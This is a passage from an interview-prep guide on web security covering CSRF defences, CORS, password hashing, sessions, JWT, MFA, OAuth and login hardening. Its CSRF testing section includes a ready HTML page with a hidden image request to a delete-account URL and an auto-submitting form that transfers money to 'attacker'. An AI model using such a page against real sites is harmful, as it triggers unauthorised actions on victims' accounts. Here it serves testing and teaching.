```javascript
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // or 'lax' or 'none'
});
```

**Three Values**:

**Strict**: Cookie never sent on cross-site requests
```javascript
sameSite: 'strict'

// Scenario:
// User clicks link on evil.com → yoursite.com
// Cookie NOT sent, user appears logged out
// Good: Maximum CSRF protection
// Bad: Poor UX (user needs to "log in again")
```

**Lax** (Recommended): Cookie sent on top-level navigation GET requests only
```javascript
sameSite: 'lax'

// Scenario:
// User clicks link: evil.com → yoursite.com
// Cookie SENT (appears logged in) ✓
// 
// Form submission: evil.com → yoursite.com POST
// Cookie NOT sent ✗
// 
// AJAX/fetch: evil.com → yoursite.com
// Cookie NOT sent ✗

// Good: Balance of security and UX
```

**None**: Cookie always sent (requires Secure flag)
```javascript
sameSite: 'none',
secure: true  // HTTPS required

// Use case: Third-party cookies (embedded widgets, OAuth)
```

**Browser Support**: Modern browsers default to `Lax` if not specified.

---

### 3. Double Submit Cookie Pattern

**How it works**: Send token both as cookie and in request. Server verifies they match.

```javascript
// Server sets CSRF token as cookie
res.cookie('csrf-token', token, { sameSite: 'strict' });

// Client includes same token in request
await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf-token')
  },
  body: JSON.stringify(data)
});

// Server verification
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  
  if (cookieToken !== headerToken) {
    return res.status(403).send('CSRF token mismatch');
  }
  
  // Process request
});
```

**Why it works**: Attacker can't read cookie value due to Same-Origin Policy, so can't include matching token in header.

---

### 4. Origin and Referer Header Validation

**Check where request came from**:
```javascript
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com'];
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).send('Invalid origin');
  }
  
  // Process request
});
```

**Limitations**:
- Headers can be missing (not all browsers send them)
- Can't rely on this alone
- Use as additional layer

---

### 5. Custom Request Headers

**For AJAX/Fetch APIs**:
```javascript
// Client
await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Custom-Header': 'MyApp'
  },
  body: JSON.stringify(data)
});

// Server
app.post('/api/transfer', (req, res) => {
  if (!req.headers['x-requested-with']) {
    return res.status(403).send('Invalid request');
  }
  // Process
});
```

**Why it works**: Simple HTML forms and IMG tags can't set custom headers. Only JavaScript can, and cross-origin JavaScript is blocked by Same-Origin Policy.

---

### 6. Re-Authentication for Sensitive Actions

**Best practice for critical operations**:
```javascript
// Require password re-entry for sensitive actions
app.post('/api/delete-account', async (req, res) => {
  const { password } = req.body;
  
  // Verify password
  const valid = await verifyPassword(req.user.id, password);
  if (!valid) {
    return res.status(401).send('Invalid password');
  }
  
  // Even if CSRF bypass exists, attacker needs victim's password
  await deleteAccount(req.user.id);
});
```

---

### CSRF Testing

**Manual Testing**:
```html
<!-- Create test page: csrf-test.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>CSRF Test</h1>
  
  <!-- Test GET request -->
  <img src="https://target.com/delete-account" style="display:none;">
  
  <!-- Test POST request -->
  <form action="https://target.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

**Test Checklist**:
- [ ] Try submitting form from different origin
- [ ] Try without CSRF token
- [ ] Try with invalid CSRF token
- [ ] Try replaying old CSRF token
- [ ] Try using victim's token on different account

---

### Interview Talking Points

**"Explain CSRF simply"**:
"Imagine you're logged into your bank and you visit a malicious website. That website has a hidden form that says 'transfer $5000 to attacker'. Because you're already logged in, your browser automatically sends your bank login cookie with the transfer request. The bank thinks it's you making the transfer. CSRF tokens prevent this by requiring a secret code that the malicious site can't access."

**"Why can't attackers just steal CSRF tokens?"**:
"Due to the Same-Origin Policy, JavaScript from evil.com cannot read content from bank.com. The attacker can make the victim's browser send requests to bank.com, but they can't read the responses containing CSRF tokens. It's like being able to mail letters but not read incoming mail."

**"What's the difference between CSRF and clickjacking?"**:
"CSRF tricks the browser into sending requests automatically. Clickjacking tricks the user into clicking something they can't see properly, like an invisible iframe. CSRF exploits authentication; clickjacking exploits user interaction. Both can lead to unwanted actions, but the attack vector is different."

**"Is SameSite cookie enough for CSRF protection?"**:
"`SameSite=Lax` or `Strict` provides strong CSRF protection for modern browsers. However, for defense in depth, especially if supporting older browsers, you should still implement CSRF tokens. Security is about layers - if one fails, others should protect you."

**"Why not just check Referer header?"**:
"Referer header isn't always present - some browsers, privacy extensions, or configurations remove it. Users behind corporate proxies might have it stripped. Also, there are ways to manipulate it in certain scenarios. It's good as an additional check but shouldn't be your only defense."

---

## Cross-Origin Resource Sharing (CORS)

### What is CORS?

**CORS (Cross-Origin Resource Sharing)** is a security mechanism that allows browsers to make requests to a different domain than the one serving the web page. It's a relaxation of the Same-Origin Policy.

**Same-Origin Policy (SOP)**: Browser security feature that restricts how documents or scripts from one origin can interact with resources from another origin.

**Origin**: Protocol + Domain + Port
```
https://example.com:443/page
  ↓       ↓             ↓
Protocol Domain       Port

Same origin examples:
✓ https://example.com/page1 and https://example.com/page2
✓ https://example.com:443 and https://example.com

Different origin examples:
✗ https://example.com and http://example.com (different protocol)
✗ https://example.com and https://api.example.com (different subdomain)
✗ https://example.com and https://example.com:8080 (different port)
```

### Why CORS Exists

**Problem CORS solves**:
```
Your site: https://myapp.com
API: https://api.example.com

Without CORS:
JavaScript on myapp.com cannot make AJAX requests to api.example.com
Browser blocks it due to Same-Origin Policy
```

**CORS allows**: Controlled relaxation of SOP, letting servers specify which origins can access their resources.

### How CORS Works

**Simple Request Flow**:
```
1. Browser: "I want to GET https://api.example.com/data"
   Origin: https://myapp.com
   
2. Server responds with:
   Access-Control-Allow-Origin: https://myapp.com
   
3. Browser: "Server allows myapp.com, I'll show the response"
```

**Preflight Request Flow** (for complex requests):
```
1. Browser sends OPTIONS request (preflight):
   OPTIONS /data
   Origin: https://myapp.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type
   
2. Server responds:
   Access-Control-Allow-Origin: https://myapp.com
   Access-Control-Allow-Methods: GET, POST
   Access-Control-Allow-Headers: Content-Type
   Access-Control-Max-Age: 86400
   
3. Browser: "Preflight approved, send actual request"
   
4. Browser sends actual POST request
   
5. Server responds with data + CORS headers
```

### CORS Headers Explained

**Response Headers (Server → Browser)**:

**1. Access-Control-Allow-Origin**
```
Most important header. Specifies which origins can access resource.

Access-Control-Allow-Origin: https://example.com
- Only example.com can access

Access-Control-Allow-Origin: *
- Any origin can access
- ⚠️ Warning: Don't use with credentials (cookies, auth headers)

// Dynamic origin
const allowedOrigins = ['https://app1.com', 'https://app2.com'];
if (allowedOrigins.includes(req.headers.origin)) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
}
```

**2. Access-Control-Allow-Methods**
```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Specifies allowed HTTP methods
```

**3. Access-Control-Allow-Headers**
```
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
Specifies which headers client can send
```

**4. Access-Control-Allow-Credentials**
```
Access-Control-Allow-Credentials: true

Required when sending cookies or auth headers
Must NOT use Access-Control-Allow-Origin: * with this
```

**5. Access-Control-Max-Age**
```
Access-Control-Max-Age: 86400

How long (seconds) browser can cache preflight response
Reduces preflight requests
```

**6. Access-Control-Expose-Headers**
```
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number

By default, JavaScript can only read:
- Cache-Control
- Content-Language
- Content-Type
- Expires
- Last-Modified
- Pragma

This header exposes additional headers to JavaScript
```

**Request Headers (Browser → Server)**:

**Origin**
```
Origin: https://example.com
Browser automatically adds this
Cannot be modified by JavaScript
```

**Access-Control-Request-Method**
```
Access-Control-Request-Method: POST
Used in preflight to indicate actual request method
```

**Access-Control-Request-Headers**
```
Access-Control-Request-Headers: Content-Type, Authorization
Used in preflight to indicate headers in actual request
```

### Simple vs Preflighted Requests

**Simple Requests** (no preflight):
```
Requirements:
1. Method: GET, HEAD, or POST
2. Only simple headers:
   - Accept
   - Accept-Language
   - Content-Language
   - Content-Type (only application/x-www-form-urlencoded, multipart/form-data, text/plain)
3. No event listeners on XMLHttpRequest.upload
4. No ReadableStream in request
```

**Preflighted Requests** (requires preflight):
```
Triggers preflight if:
1. Method: PUT, DELETE, PATCH, or other
2. Custom headers (Authorization, X-Custom-Header)
3. Content-Type: application/json
4. Includes credentials
```

### CORS Implementation

**Node.js/Express**:
```javascript
// Basic CORS (allow all)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Using cors middleware
const cors = require('cors');

// Allow all origins
app.use(cors());

// Specific configuration
app.use(cors({
  origin: 'https://example.com',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400
}));

// Dynamic origin
app.use(cors({
  origin: (origin, callback) => {
    const allowedOrigins = ['https://app1.com', 'https://app2.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));

// Route-specific CORS
app.get('/public-api', cors(), (req, res) => {
  res.json({ data: 'public' });
});

app.get('/private-api', cors({ origin: 'https://trusted.com' }), (req, res) => {
  res.json({ data: 'private' });
});

// Handle preflight
app.options('*', cors());
```

**Frontend (Credentials)**:
```javascript
// Sending cookies with CORS request
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include',  // Send cookies
  headers: {
    'Content-Type': 'application/json'
  }
});

// XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', 'https://api.example.com/data');
xhr.send();
```

### Common CORS Errors

**Error 1: "No 'Access-Control-Allow-Origin' header present"**
```
Problem: Server not sending CORS headers
Solution: Add Access-Control-Allow-Origin header on server
```

**Error 2: "Origin not allowed by Access-Control-Allow-Origin"**
```
Problem: Your origin not in server's allowed list
Solution: Add your origin to server's allowed origins
```

**Error 3: "Credentials flag is true, but Access-Control-Allow-Credentials is not"**
```
Problem: Sending credentials but server not allowing them
Solution: 
Server: Access-Control-Allow-Credentials: true
AND Access-Control-Allow-Origin: https://specific-origin.com (not *)
```

**Error 4: "Method not allowed by Access-Control-Allow-Methods"**
```
Problem: Using PUT/DELETE but server only allows GET/POST
Solution: Add method to Access-Control-Allow-Methods
```

**Error 5: "Request header not allowed by Access-Control-Allow-Headers"**
```
Problem: Sending Authorization header but not allowed
Solution: Add Authorization to Access-Control-Allow-Headers
```

### CORS Security Considerations

**1. Avoid Access-Control-Allow-Origin: \***
```javascript
// ❌ Dangerous if API handles sensitive data
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true'); // This fails

// ✅ Use whitelist
const allowedOrigins = [
  'https://myapp.com',
  'https://staging.myapp.com'
];

if (allowedOrigins.includes(req.headers.origin)) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

**2. Validate Origin header**
```javascript
// ❌ Dangerous - reflecting any origin
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);

// ✅ Safe - validate against whitelist
const origin = req.headers.origin;
if (isAllowedOrigin(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

**3. Be careful with Access-Control-Allow-Credentials**
```javascript
// When sending credentials:
// ✓ Server must explicitly allow specific origin
// ✓ Client must set credentials: 'include'
// ✗ Cannot use Access-Control-Allow-Origin: *
```

**4. Limit exposed headers**
```javascript
// Only expose what's necessary
res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count');
// Don't expose sensitive headers
```

**5. Use appropriate Max-Age**
```javascript
// Too long: Security changes take time to propagate
// Too short: Performance impact from frequent preflights
// Recommended: 1 hour to 24 hours
res.setHeader('Access-Control-Max-Age', '3600');
```

### CORS vs CSRF

**Important Distinction**:

**CORS**:
- Browser-enforced policy
- Controls which origins can READ responses
- Doesn't prevent requests from being sent
- JavaScript cannot read cross-origin responses without CORS headers

**CSRF**:
- Prevents unauthorized STATE-CHANGING operations
- Requests ARE sent, but without proper token they're rejected
- CORS doesn't protect against CSRF

**Example**:
```javascript
// Evil site makes request to your API
// CORS blocks reading response, but request is SENT
// If it's state-changing (DELETE, POST), damage is done
// This is why you need CSRF protection IN ADDITION to CORS

Evil site: fetch('https://bank.com/delete-account')
- Request reaches server ✓
- Server processes it ✓ (if no CSRF protection)
- Evil site can't read response ✓ (CORS blocks)
- But account is deleted! ✗

Solution: CSRF token prevents request from being processed
```

### Interview Talking Points

**"What is CORS?"**:
"CORS is a mechanism that allows browsers to make requests to a different domain than the one serving the page. It's a controlled relaxation of the Same-Origin Policy. The server uses CORS headers to tell the browser which origins are allowed to access its resources."

**"Why do browsers have Same-Origin Policy?"**:
"Without SOP, malicious websites could make requests to your bank while you're logged in and read your account details. SOP ensures that JavaScript from evil.com cannot read responses from bank.com. CORS provides a safe way to opt-out of this restriction when needed."

**"Explain preflight requests"**:
"For complex requests (like POST with JSON, or requests with custom headers), browsers send an OPTIONS request first to check if the actual request is safe to send. The server responds with what's allowed (methods, headers, origins). If approved, the browser sends the real request. This prevents the server from being affected before verifying the request is allowed."

**"Can CORS prevent CSRF?"**:
"No. CORS controls whether JavaScript can READ responses from other origins. But requests are still sent to the server. CSRF can still occur because the attacker doesn't need to read the response - they just need the request to be processed. You need CSRF tokens or SameSite cookies for CSRF protection."

**"Why use Access-Control-Allow-Credentials?"**:
"When you need to send cookies or authentication headers with cross-origin requests. For example, if your frontend is on app.example.com and API is on api.example.com, you need credentials for the API to identify the user via session cookies. But this must be used carefully - you cannot use '*' for allowed origins when credentials are true."

---

## Secure Authentication

### What is Authentication?

**Authentication** is the process of verifying identity - proving "you are who you say you are."

**Authentication vs Authorization**:
- **Authentication**: Who are you? (Identity verification)
- **Authorization**: What can you do? (Permission verification)

Example: Driver's license
- Authentication: Showing ID proves you're John Doe
- Authorization: ID shows you're authorized to drive

### Password Authentication

### Password Storage - CRITICAL

**❌ NEVER Store Passwords Like This**:
```javascript
// Plain text - NEVER!
password: "myPassword123"

// Encrypted (reversible) - NEVER!
password: encrypt("myPassword123", key)

// MD5/SHA1 Hash - NEVER!
password: md5("myPassword123")
// Fast hashing = easy to brute force
// Rainbow tables can crack these instantly
```

**✅ Correct: Bcrypt/Scrypt/Argon2**:
```javascript
const bcrypt = require('bcrypt');

// Hashing password
const saltRounds = 10; // Work factor (10-12 recommended)
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
// Result: $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

// Verifying password
const isValid = await bcrypt.compare(plainPassword, hashedPassword);
```

**Why Bcrypt is secure**:
```
1. Slow by design (configurable work factor)
   - Work factor 10 = ~100ms to hash
   - Attacker trying millions of passwords = years of computation
   
2. Automatic salting
   - Each password gets unique random salt
   - Same password → different hashes
   - Prevents rainbow table attacks
   
3. Adaptive
   - Can increase work factor as computers get faster
   - Old hashes still work, just slower
```

**Password Salt Explained**:
```
Salt = random data added to password before hashing

Without salt:
hash("password123") = always "xyz123abc..."
Attacker creates rainbow table of common passwords
Instant lookup, instant crack

With salt:
hash("password123" + "randomsalt1") = "abc..."
hash("password123" + "randomsalt2") = "def..."
Same password, different hashes
Rainbow table useless
```

### Secure Password Requirements

**Modern Password Policy**:
```
✅ Recommended:
- Minimum 12 characters (longer is better than complex)
- No maximum length (within reason, 64-128 chars is fine)
- Allow all characters (spaces, unicode, etc.)
- Check against breached password database
- Require MFA instead of complex passwords
- Educate about password managers

❌ Outdated (but still common):
- Must have uppercase, lowercase, number, special char
- Max 16 characters
- Change every 90 days (encourages weak passwords)
- No password reuse (impractical without password manager)
```

**Check Against Breached Passwords**:
```javascript
const { pwnedPassword } = require('hibp'); // Have I Been Pwned API

async function isPasswordBreached(password) {
  const count = await pwnedPassword(password);
  return count > 0; // true if password found in breaches
}

// During registration/password change
const breached = await isPasswordBreached(newPassword);
if (breached) {
  return res.status(400).send('This password has been exposed in data breaches. Please choose another.');
}
```

### Session-Based Authentication

**How it works**:
```
1. User logs in with username/password
2. Server verifies credentials
3. Server creates session, stores in database
4. Server sends session ID to client as cookie
5. Client includes cookie in subsequent requests
6. Server looks up session by ID, retrieves user info
7. User logs out → session deleted
```

**Implementation**:
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const redisClient = redis.createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Long random string
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,    // Prevent XSS
    secure: true,      // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000    // 1 hour
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await User.findOne({ username });
  if (!user) {
    return res.status(401).send('Invalid credentials');
  }
  
  const validPassword = await bcrypt.compare(password, user.password);
  if (!validPassword) {
    return res.status(401).send('Invalid credentials');
  }
  
  // Create session
  req.session.userId = user.id;
  req.session.username = user.username;
  
  res.send('Logged in');
});

// Protected route
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).send('Not authenticated');
  }
  
  res.json({ userId: req.session.userId });
});

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy();
  res.send('Logged out');
});
```

**Session Storage Options**:
```
1. Memory (MemoryStore)
   ✓ Fast
   ✗ Lost on server restart
   ✗ Not shared across server instances
   Use: Development only

2. Database (connect-mongo, connect-pg)
   ✓ Persistent
   ✓ Shared across servers
   ✗ Slower than cache
   Use: Shared state with persistence

3. Redis (connect-redis)
   ✓ Fast
   ✓ Shared across servers
   ✓ Automatic expiry
   ✗ Requires Redis setup
   Use: Production (recommended)
```

### Token-Based Authentication (JWT)

**How it works**:
```
1. User logs in
2. Server verifies credentials
3. Server creates JWT token (signed, not encrypted)
4. Server sends token to client
5. Client stores token (localStorage/sessionStorage/cookie)
6. Client includes token in Authorization header
7. Server verifies token signature
8. No server-side session storage needed
```

**JWT Structure**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Part 1: Header
{
  "alg": "HS256",
  "typ": "JWT"
}

Part 2: Payload (Claims)
{
  "userId": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,  // Issued at
  "exp": 1516242622   // Expiration
}

Part 3: Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  SECRET_KEY
)
```

**Implementation**:
```javascript
const jwt = require('jsonwebtoken');

// Login - create JWT
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await User.findOne({ username });
  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).send('Invalid credentials');
  }
  
  // Create token
  const token = jwt.sign(
    { 
      userId: user.id,
      username: user.username,
      role: user.role
    },
    process.env.JWT_SECRET,
    { 
      expiresIn: '1h',
      issuer: 'myapp.com',
      audience: 'myapp.com'
    }
  );
  
  res.json({ token });
});

// Middleware to verify JWT
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    return res.status(401).send('No token provided');
  }
  
  const token = authHeader.split(' ')[1]; // Bearer TOKEN
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(403).send('Invalid token');
  }
};

// Protected route
app.get('/profile', authenticateJWT, (req, res) => {
  res.json({ user: req.user });
});

// Client-side usage
// Store token
localStorage.setItem('token', token);

// Send with requests
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});
```

**JWT Security Considerations**:

**1. Storage Location**:
```
localStorage:
✓ Easy to access
✗ Vulnerable to XSS (JavaScript can steal it)
✗ Persists forever unless explicitly removed

sessionStorage:
✓ Cleared on tab close
✗ Vulnerable to XSS

Cookie (HttpOnly):
✓ Not accessible to JavaScript (XSS protection)
✓ Automatic sending
✗ Vulnerable to CSRF (need CSRF protection)
✗ Size limit (4KB)

Recommended: HttpOnly cookie + CSRF token
```

**2. Token Expiration**:
```javascript
// Short-lived access token + refresh token pattern
const accessToken = jwt.sign(payload, SECRET, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, REFRESH_SECRET, { expiresIn: '7d' });

// When access token expires, use refresh token to get new access token
app.post('/refresh', (req, res) => {
  const { refreshToken } = req.body;
  
  try {
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      SECRET,
      { expiresIn: '15m' }
    );
    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.status(403).send('Invalid refresh token');
  }
});
```

**3. Payload Security**:
```javascript
// ❌ Don't include sensitive data in JWT
const token = jwt.sign({
  userId: user.id,
  password: user.password,  // NEVER!
  ssn: user.ssn            // NEVER!
}, SECRET);

// ✅ Include only necessary, non-sensitive data
const token = jwt.sign({
  userId: user.id,
  role: user.role
}, SECRET);

// JWT is base64 encoded, NOT encrypted
// Anyone can decode and read the payload
// Only the signature ensures it hasn't been tampered with
```

**4. Secret Key Management**:
```javascript
// ❌ NEVER hardcode secrets
const SECRET = 'mySecretKey123';

// ✅ Use environment variables
const SECRET = process.env.JWT_SECRET;

// Generate strong secret:
// node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

// Rotate secrets periodically
// Support multiple secrets for rotation:
const SECRETS = [
  process.env.JWT_SECRET_NEW,
  process.env.JWT_SECRET_OLD
];

function verifyToken(token) {
  for (const secret of SECRETS) {
    try {
      return jwt.verify(token, secret);
    } catch (err) {
      continue;
    }
  }
  throw new Error('Invalid token');
}
```

### Multi-Factor Authentication (MFA)

**What it is**: Requiring two or more verification factors:
1. **Something you know** (password)
2. **Something you have** (phone, hardware token)
3. **Something you are** (biometric)

**Types**:

**1. SMS/Email OTP**:
```javascript
const speakeasy = require('speakeasy');
const nodemailer = require('nodemailer');

// Generate OTP
const otp = speakeasy.totp({
  secret: process.env.OTP_SECRET,
  encoding: 'base32',
  step: 300 // 5 minutes validity
});

// Send via email
await sendEmail(user.email, `Your code: ${otp}`);

// Store temporarily
await redis.setex(`otp:${user.id}`, 300, otp);

// Verify
app.post('/verify-otp', async (req, res) => {
  const { userId, otp } = req.body;
  const stored = await redis.get(`otp:${userId}`);
  
  if (otp === stored) {
    // OTP valid, complete login
    req.session.userId = userId;
    await redis.del(`otp:${userId}`);
    res.send('Logged in');
  } else {
    res.status(401).send('Invalid OTP');
  }
});
```

**2. TOTP (Time-based One-Time Password - Google Authenticator)**:
```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Setup - generate secret for user
app.post('/setup-2fa', async (req, res) => {
  const secret = speakeasy.generateSecret({
    name: 'MyApp (user@example.com)'
  });
  
  // Store secret.base32 in user's database record
  await User.updateOne(
    { id: req.user.id },
    { totpSecret: secret.base32 }
  );
  
  // Generate QR code for user to scan with authenticator app
  const qrCode = await QRCode.toDataURL(secret.otpauth_url);
  
  res.json({ qrCode, secret: secret.base32 });
});

// Verify TOTP
app.post('/verify-2fa', async (req, res) => {
  const { token } = req.body;
  const user = await User.findById(req.user.id);
  
  const verified = speakeasy.totp.verify({
    secret: user.totpSecret,
    encoding: 'base32',
    token: token,
    window: 2 // Allow 2 steps before/after for clock skew
  });
  
  if (verified) {
    req.session.mfaVerified = true;
    res.send('MFA verified');
  } else {
    res.status(401).send('Invalid token');
  }
});
```

**3. WebAuthn (FIDO2) - Hardware Keys**:
```javascript
// Most secure, but complex implementation
// Uses cryptographic keys stored on hardware devices (YubiKey, etc.)
// Phishing-resistant (only works on correct domain)
```

**MFA Best Practices**:
```
✓ Offer backup codes (for lost phone/device)
✓ Remember device (don't ask for MFA on every login from trusted devices)
✓ Use MFA for sensitive operations (password change, account deletion)
✓ Offer recovery options
✓ Prefer TOTP or WebAuthn over SMS (SIM swapping attacks)
✗ Don't make MFA optional for high-value accounts
✗ Don't accept backup codes multiple times
```

### OAuth 2.0 / OpenID Connect

**OAuth 2.0**: Authorization framework (delegate access without sharing password)
**OpenID Connect**: Authentication layer on top of OAuth 2.0

**Use Case**: "Sign in with Google/Facebook/GitHub"

**Flow (Authorization Code)**:
```
1. User clicks "Sign in with Google"
2. App redirects to Google's authorization page
3. User logs into Google, grants permissions
4. Google redirects back with authorization code
5. App exchanges code for access token (server-to-server)
6. App uses access token to get user info from Google
7. App creates session/JWT for user
```

**Implementation** (using Passport.js):
```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: "https://myapp.com/auth/google/callback"
  },
  async (accessToken, refreshToken, profile, done) => {
    // Find or create user
    let user = await User.findOne({ googleId: profile.id });
    
    if (!user) {
      user = await User.create({
        googleId: profile.id,
        email: profile.emails[0].value,
        name: profile.displayName
      });
    }
    
    return done(null, user);
  }
));

// Routes
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] })
);

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // Successful authentication
    res.redirect('/dashboard');
  }
);
```

**Security Considerations**:
```
✓ Use HTTPS for redirect URIs
✓ Validate state parameter (CSRF protection)
✓ Store tokens securely
✓ Use PKCE for public clients (SPAs, mobile apps)
✓ Refresh tokens should be long-lived but revocable
✗ Don't use implicit flow (deprecated, insecure)
✗ Don't store tokens in localStorage (XSS risk)
```

### Security Best Practices for Authentication

**1. Rate Limiting**:
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/login', loginLimiter, async (req, res) => {
  // Login logic
});
```

**2. Account Lockout**:
```javascript
app.post('/login', async (req, res) => {
  const user = await User.findOne({ username });
  
  // Check if account locked
  if (user.lockUntil && user.lockUntil > Date.now()) {
    return res.status(423).send('Account locked. Try again later.');
  }
  
  const valid = await bcrypt.compare(password, user.password);
  
  if (!valid) {
    user.failedLoginAttempts += 1;
    
    // Lock after 5 failed attempts
    if (user.failedLoginAttempts >= 5) {
      user.lockUntil = Date.now() + 3600000; // 1 hour
    }
    
    await user.save();
    return res.status(401).send('Invalid credentials');
  }
  
  // Reset on successful login
  user.failedLoginAttempts = 0;
  user.lockUntil = null;
  await user.save();
  
  // Create session
});
```

**3. Timing Attack Prevention**:
```javascript
// ❌ Vulnerable - different response times reveal if user exists
app.post('/login', async (req, res) => {
  const user = await User.findOne({ username });
  
  if (!user) {
    return res.status(401).send('Invalid credentials'); // Fast response
  }
  
  const valid = await bcrypt.compare(password, user.password);
  if (!valid) {
    return res.status(401).send('Invalid credentials'); // Slow response (bcrypt)
  }
});

// ✅ Secure - consistent timing
app.post('/login', async (req, res) => {
  const user = await User.findOne({ username });
  
  // Always hash, even if user doesn't exist
  const hash = user ? user.password : '$2b$10$dummyHashToPreventTimingAttack';
  const valid = await bcrypt.compare(password, hash);
  
  if (!user || !valid) {
    return res.status(401).send('Invalid credentials');
  }
  
  // Create session
});
```

**4. Secure Password Reset**:
```javascript
const crypto = require('crypto');

// Request reset
app.post('/forgot-password', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  
  if (!user) {
    // Don't reveal if email exists
    return res.send('If account exists, reset email sent');
  }
  
  // Generate secure random token
  const resetToken = crypto.randomBytes(32).toString('hex');
  const hashedToken = crypto.createHash('sha256').update(resetToken).digest('hex');
  
  user.resetToken = hashedToken;
  user.resetTokenExpiry = Date.now() + 3600000; // 1 hour
  await user.save();
  
  // Send email with resetToken (not hashedToken)
  const resetUrl = `https://myapp.com/reset-password?token=${resetToken}`;
  await sendEmail(user.email, resetUrl);
  
  res.send('If account exists, reset email sent');
});

// Reset password
app.post('/reset-password', async (req, res) => {
  const { token, newPassword } = req.body;
  
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');
  
  const user = await User.findOne({
    resetToken: hashedToken,
    resetTokenExpiry: { $gt: Date.now() }
  });
  
  if (!user) {
    return res.status(400).send('Invalid or expired token');
  }
  
  // Update password
  user.password = await bcrypt.hash(newPassword, 10);
  user.resetToken = undefined;
  user.resetTokenExpiry = undefined;
  await user.save();
  
  // Invalidate all sessions
  // Send confirmation email
  
  res.send('Password reset successful');
});
```

**5. Audit Logging**:
```javascript
// Log all authentication events
async function logAuthEvent(userId, event, ip, userAgent, success) {
  await AuthLog.create({
    userId,
    event, // 'login', 'logout', 'password_change', 'mfa_setup'
    ip,
    userAgent,
    success,
    timestamp: new Date()
  });
}

app.post('/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username });
  const valid = user && await bcrypt.compare(req.body.password, user.password);
  
  await logAuthEvent(
    user?.id,
    'login',
    req.ip,
    req.headers['user-agent'],
    valid
  );
  
  // Rest of login logic
});
```

### Interview Talking Points

**"Explain how password hashing works"**:
